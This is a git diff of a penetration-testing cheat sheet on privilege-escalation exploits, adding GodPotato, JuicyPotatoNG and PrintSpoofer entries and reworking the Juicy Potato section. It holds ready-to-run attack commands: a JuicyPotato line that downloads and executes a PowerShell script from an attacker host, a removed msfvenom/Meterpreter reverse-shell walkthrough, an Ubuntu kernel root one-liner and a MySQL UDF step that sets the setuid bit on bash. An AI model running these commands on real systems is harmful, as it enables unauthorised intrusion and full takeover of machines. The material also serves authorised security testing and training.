@@ -25,8 +25,11 @@
 - [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass)
 - [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-PE-0-day-PowerShell-Implementation)
 - [CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-32629-CVE-2023-2640-GameOverlay-Ubuntu-Kernel-Exploit-LPE-0-day)
+- [GodPotato](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
+- [JuicyPotatoNG LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#JuicyPotatoNG-LPE)
 - [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#MySQL-4x50-User-Defined-Function-UDF-Dynamic-Library-2-LPE)
+- [PrintSpoofer](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#PrintSpoofer)
 - [RemotePotato0 PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#RemotePotato0-PE)
 - [SharpEfsPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato-LPE)
 - [Shocker Container Escape](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shocker-Container-Escape)
@@ -1007,33 +1010,95 @@ $ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
 setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
 ```
 
+## GodPotato
+
+> https://github.com/BeichenDream/GodPotato
+
+```c
+PS C:\> .\GodPotato-NET4.exe -cmd '<COMMAND>'
+```
+
 ## Juicy Potato LPE
 
 > https://github.com/ohpe/juicy-potato
 
-> http://ohpe.it/juicy-potato/CLSID
+> http://ohpe.it/juicy-potato/CLSID/
 
-### msfvenom and Metasploit Execution
+### GetCLSID.ps1
 
 ```c
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
+<#
+This script extracts CLSIDs and AppIDs related to LocalService.DESCRIPTION
+Then exports to CSV
+#>
+
+$ErrorActionPreference = "Stop"
+
+New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT
+
+Write-Output "Looking for CLSIDs"
+$CLSID = @()
+Foreach($ID in (Get-ItemProperty HKCR:\clsid\* | select-object AppID,@{N='CLSID'; E={$_.pschildname}})){
+    if ($ID.appid -ne $null){
+        $CLSID += $ID
+    }
+}
+
+Write-Output "Looking for APIDs"
+$APPID = @()
+Foreach($AID in (Get-ItemProperty HKCR:\appid\* | select-object localservice,@{N='AppID'; E={$_.pschildname}})){
+    if ($AID.LocalService -ne $null){
+        $APPID += $AID
+    }
+}
+
+Write-Output "Joining CLSIDs and APIDs"
+$RESULT = @()
+Foreach ($app in $APPID){
+    Foreach ($CLS in $CLSID){
+        if($CLS.AppId -eq $app.AppID){
+            $RESULT += New-Object psobject -Property @{
+                AppId    = $app.AppId
+                LocalService = $app.LocalService
+                CLSID = $CLS.CLSID
+            }
+
+            break
+        }
+    }
+}
+
+$RESULT = $RESULT | Sort-Object LocalService
+
+# Preparing to Output
+$OS = (Get-WmiObject -Class Win32_OperatingSystem | ForEach-Object -MemberName Caption).Trim() -Replace "Microsoft ", ""
+$TARGET = $OS -Replace " ","_"
+
+# Make target folder
+New-Item -ItemType Directory -Force -Path .\$TARGET
+
+# Output in a CSV
+$RESULT | Export-Csv -Path ".\$TARGET\CLSIDs.csv" -Encoding ascii -NoTypeInformation
+
+# Export CLSIDs list
+$RESULT | Select CLSID -ExpandProperty CLSID | Out-File -FilePath ".\$TARGET\CLSID.list" -Encoding ascii
+
+# Visual Table
+$RESULT | ogv
 ```
 
-```c
-msf6 > use exploit/multi/handler
-msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST <LHOST>
-msf6 exploit(multi/handler) > set LPORT <LHOST>
-msf6 exploit(multi/handler) > run
-```
+### Execution
 
 ```c
-C:\> .\exploit.exe
+PS C:\> .\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" -t *
 ```
 
+## JuicyPotatoNG LPE
+
+> https://github.com/antonioCoco/JuicyPotatoNG
+
 ```c
-[*] Sending stage (175174 bytes) to <RHOST>
-[*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
+PS C:\> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c whoami"
 ```
 
 ## MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE
@@ -1056,6 +1121,14 @@ $ mysql -u root
 > select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 > create function do_system returns integer soname 'raptor_udf2.so';
 > select do_system('chmod +s /bin/bash');
+```
+
+## PrintSpoofer
+
+> https://github.com/itm4n/PrintSpoofer
+
+```c
+PS C:\> .\PrintSpoofer64.exe -i -c powershell
 ```
 
 ## RemotePotato0 PE
